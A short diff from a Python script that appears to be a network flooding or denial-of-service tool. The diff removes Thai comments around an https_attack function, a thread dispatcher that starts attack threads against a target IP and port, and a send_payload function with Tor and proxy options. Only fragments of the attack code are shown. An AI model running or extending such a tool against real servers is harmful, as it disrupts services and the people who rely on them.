@@ -425,12 +425,10 @@ def send_payload(use_tor=False, proxy_ip=None, proxy_port=None):
 
 def https_attack():
     try:
-        # สร้าง TCP socket ปกติ
         raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         raw_sock.settimeout(3)
         raw_sock.connect((target_ip, port_target))
 
-        # ห่อด้วย SSL เพื่อให้คุยกับ HTTPS ได้
         context = ssl.create_default_context()
         s = context.wrap_socket(raw_sock, server_hostname=target_ip)
 
@@ -529,7 +527,6 @@ if check_target(target_ip, port_target):
         elif args.port == 443:
             t = threading.Thread(target=https_attack, daemon=True)
 
-        # 
         else:
             t = threading.Thread(target=main_attack, daemon=True)
         t.start()
@@ -538,5 +535,3 @@ if check_target(target_ip, port_target):
 
 else:
     print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Target not reachable. Aborting.{styles['reset']}")
-
-# กัน script หลุด
